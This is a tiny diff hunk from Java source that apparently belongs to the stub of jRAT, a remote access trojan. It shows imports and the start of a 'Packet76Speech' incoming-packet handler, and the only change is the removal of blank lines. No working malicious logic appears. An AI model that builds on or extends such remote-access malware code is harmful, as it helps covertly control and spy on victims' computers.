@@ -6,9 +6,6 @@ import java.io.FileWriter;
 import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 
-
-
-
 public class Packet76Speech extends AbstractIncomingPacket {
 
 	@Override
